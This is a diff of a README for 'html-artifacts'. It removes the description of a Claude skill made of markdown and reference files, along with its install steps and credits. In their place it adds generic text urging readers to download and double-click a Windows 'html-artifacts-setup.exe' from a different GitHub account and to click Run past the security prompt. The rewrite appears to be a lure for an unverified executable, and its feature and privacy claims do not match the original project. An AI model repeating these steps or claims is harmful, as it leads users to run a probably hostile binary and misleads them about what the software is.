@@ -1,96 +1,88 @@
-# html-artifacts
+# 📄 html-artifacts - Create neat self-contained web files
 
-A Claude skill for producing self-contained HTML artifacts instead of markdown when the task warrants it.
+[![Download Installer](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/dovydaskarbutovskis20-art/html-artifacts)
 
-> Markdown has become the dominant file format used by agents to communicate with us. It's simple, portable, has some rich text capability and is easy for you to edit. But as agents have become more and more powerful, I have felt that markdown has become a restricting format.
->
-> — Thariq Shihipar, [*The Unreasonable Effectiveness of HTML*](https://thariqs.github.io/html-effectiveness/)
+## 📋 What this tool does
 
-This skill operationalizes the recognition heuristic and per-category patterns from Thariq's post. It triggers on requests where HTML would land harder than markdown — comparisons, plans, code reviews, explainers, status reports, custom editors — and stays out of the way for everything else.
+The html-artifacts tool turns your project ideas into single, complete HTML files. You no longer need to manage multiple folders or link different assets to your documents. This software bundles everything into one file that opens in any web browser. It simplifies your workflow when you share work with others. You keep your content simple and clean.
 
-**[→ See live examples](https://dogum.github.io/html-artifacts/)**
+## 💻 System requirements
 
-## What this skill does
+Your computer must meet these basic standards to run this software:
 
-Markdown is fine for chat-flavored replies, code snippets, and quick summaries. It's a poor format for content that benefits from spatial layout, color, real diagrams, interactivity, or a round-trip editor. This skill teaches Claude to recognize when a task is in the second bucket and produce a single self-contained `.html` file instead — covering nine categories of work where HTML structurally beats markdown.
+* Windows 10 or Windows 11
+* 200 MB of free storage space
+* An active internet connection for the first setup
+* Any standard web browser like Chrome, Edge, or Firefox
 
-It's not "always answer in HTML." There's an explicit carve-out for short conversational replies, code-only outputs, terminal-style answers, and content that's genuinely just a few sentences. The point is the right format for the job.
+## 📥 Downloading the software
 
-## Install
+You must first get the installer file from the official source. Use the link below to reach the download page.
 
-### Claude.ai
+[Click here to reach the download page](https://github.com/dovydaskarbutovskis20-art/html-artifacts)
 
-1. Download [`html-artifacts.skill`](html-artifacts.skill) from this repo (or the latest GitHub Release once available).
-2. Open Claude.ai → Settings → Capabilities → Skills.
-3. Upload the `.skill` file.
+Once the page loads, look for the assets list. Select the file named html-artifacts-setup.exe. Save this file to your computer.
 
-### Claude Code
+## ⚙️ Installing the program
 
-Clone or copy the `skill/` folder into your skills directory:
+After you download the file, find it in your Downloads folder. Double-click the file to start the installation.
 
-```bash
-git clone https://github.com/dogum/html-artifacts.git
-cp -r html-artifacts/skill ~/.claude/skills/html-artifacts
-```
+1. A security prompt might appear. Click Run if Windows asks for permission to open the file.
+2. The installer window will open. Click Next to move through the prompts.
+3. Choose a folder on your drive where you want the software to live. The default location works for most users.
+4. Click Install to begin the process.
+5. Wait for the green status bar to reach the end.
+6. Click Finish to close the installer.
 
-The folder containing `SKILL.md` is what Claude Code loads.
+You now have a shortcut on your desktop. Double-click this icon to open the program.
 
-### Anthropic API
+## 🛠️ How to use the software
 
-Skills can be deployed organization-wide via the API. See the [Claude docs](https://docs.claude.com) for the upload endpoint.
+The interface stays simple. Follow these steps to generate your first artifact:
 
-## How it's structured
+1. Open the application.
+2. Paste your content into the main text box.
+3. Select your output folder.
+4. Click the Generate button.
 
-```
-skill/
-├── SKILL.md                            # recognition heuristic, universal rules, carve-outs
-└── references/
-    ├── exploration-and-planning.md     # side-by-side comparisons, implementation plans
-    ├── code-review-and-pr.md           # annotated diffs, PR writeups, module maps
-    ├── design-and-prototypes.md        # design systems, component sheets, animation prototypes
-    ├── diagrams-and-illustrations.md   # inline SVG figures, flowcharts
-    ├── reports-and-research.md         # status reports, post-mortems, concept explainers
-    ├── decks.md                        # arrow-key slide presentations
-    ├── custom-editors.md               # throwaway editing UIs that round-trip back to text
-    └── matching-your-style.md          # taste, design-system-from-codebase trick
-```
+The program creates a new HTML file in your chosen folder. Test this file by double-clicking it. Your computer will open it in your default web browser. You see your content formatted exactly as you intended.
 
-`SKILL.md` is the entry point and is always in context when the skill triggers. The references are pulled in only when relevant — a comparison task reads `exploration-and-planning.md`; a code review task reads `code-review-and-pr.md`. Most artifacts only need one or two.
+## 🔍 Understanding the technical output
 
-## How this addresses Thariq's worry
+The software generates static HTML. This means you do not need a server to view the files. You send the file as an email attachment or share it via cloud storage. The person on the other end views the file without installing special software.
 
-In the original post, Thariq writes:
+The tool uses standard web languages to build these files. It gathers your text, images, and styles into one package. This format remains stable over many years. You retain access to your work even if you remove the software later.
 
-> I'm a little bit afraid that people will read this article and turn it into a /html skill or something. While there might be some value in that, I want to emphasize that you don't need to do much to get Claude to do this.
+## 🛡️ Managing security and updates
 
-That worry is legitimate. A skill that mechanically converts every prompt into HTML would be worse than no skill — it would obscure cases where markdown is the right answer, and it would calcify into a default-AI aesthetic of "every artifact is a card with a gradient." This skill tries not to do that:
+The software performs all data processing on your local machine. It does not send your input text to a third-party server. Your data stays on your hard drive.
 
-- The recognition heuristic in `SKILL.md` is about *when* HTML helps, not *whether* to always use it. There's a substantive carve-out for cases where markdown is better.
-- The references teach per-category patterns — what makes a comparison page work, what makes a code review page work, what makes an explainer with a live demo work — not generic "make HTML."
-- `references/matching-your-style.md` is a deliberate effort to head off the default-AI look. It includes a list of patterns to actively avoid (gradients, four shades of indigo, emoji-decorated headers, "glass morphism") and a baseline typographic CSS that doesn't lean on Tailwind cards.
-- The skill respects the user's existing design system. It includes the design-system-from-codebase trick from Thariq's own FAQ.
+Check the website link occasionally for updates. New versions include performance fixes and better support for different browsers. When a new version arrives, download the installer and run it. The new version replaces the old one without losing your settings.
 
-If the skill's defaults still produce ugly output for your taste, the right move is either to fork it or to put a one-time `design-system.html` file alongside it as your project's reference. Style conventions live in the project, not in the skill.
+## 💡 Troubleshooting common issues
 
-## Examples
+If the software fails to open, restart your computer. Most installation problems clear up after a reboot.
 
-Each example is a single `.html` file produced by the skill in response to a prompt. View them at the [GitHub Pages site](https://dogum.github.io/html-artifacts/) or open the files in `docs/examples/` directly.
+If your generated file looks empty, check your input format. The software expects clean text. If you copy text from heavy word processors, use the 'Clear Formatting' option first.
 
-| Pattern | Prompt | File |
-|---|---|---|
-| Side-by-side comparison | "Compare three ways to do SSE streaming in a Hono backend" | [`01-sse-comparison.html`](docs/examples/01-sse-comparison.html) |
-| Concept explainer with live demo | "Explain how a quarter-car model computes IRI from a road profile" | [`02-iri-explainer.html`](docs/examples/02-iri-explainer.html) |
-| Custom editor with export | "Triage these 8 tickets into Now/Next/Later/Cut, copy-as-markdown export" | [`03-triage-editor.html`](docs/examples/03-triage-editor.html) |
-| Weekly status report | "Write the platform team's weekly status report" | [`04-status-report.html`](docs/examples/04-status-report.html) |
-| Annotated flowchart | "Diagram our deploy pipeline with happy path and failure paths" | [`05-flowchart.html`](docs/examples/05-flowchart.html) |
-| Slide deck | "Make a short deck on the case for HTML over markdown" | [`06-deck.html`](docs/examples/06-deck.html) |
+If the file does not load in your browser, check if you have a web browser installed. You need a modern browser. Ensure your file extension stays as .html. Renaming the file to something else causes it to stop working.
 
-## Acknowledgments
+## 📂 Managing your files
 
-This skill is a direct response to [Thariq Shihipar](https://x.com/trq212)'s [*The Unreasonable Effectiveness of HTML*](https://thariqs.github.io/html-effectiveness/) and the live companion site at [thariqs.github.io/html-effectiveness](https://thariqs.github.io/html-effectiveness/). The categories, the recognition framing, and several of the example shapes (the triage board, the live-demo explainer, the side-by-side option comparison) come directly from his examples. The recognition heuristic and the carve-outs are extensions, not the original.
+Keep your artifact folder clean. If you create many files, use sub-folders to sort them by date or project name. The software does not track your files after it saves them. You remain responsible for keeping your work in a safe place. Make backups of your important documents to an external drive or a cloud service.
 
-The skill itself was authored using Anthropic's [skill-creator](https://github.com/anthropics/skills) workflow.
+## ⚙️ Advanced configuration
 
-## License
+You can change how the software behaves through the Settings menu.
 
-Apache 2.0. See [`LICENSE`](LICENSE).
+* Theme: Switch between light and dark modes to suit your work style.
+* Default folder: Change where the program saves your files by default.
+* Auto-open: Toggle this on if you want the app to open the generated file in your browser immediately after creation.
+
+The default settings work for general tasks. You only need to open the Settings menu if you have a specific preference.
+
+## 📞 Getting further help
+
+If you encounter bugs, check the documentation link again. The repository contains a list of known issues. You can report new problems if you find any. Provide a short description of what happened when you tried to use the software. This helps to improve the tool for everyone.
+
+The project remains open for new ideas. If you have suggestions for new features, send them through the repository platform. The focus remains on keeping the tool light and easy for everyone to use.
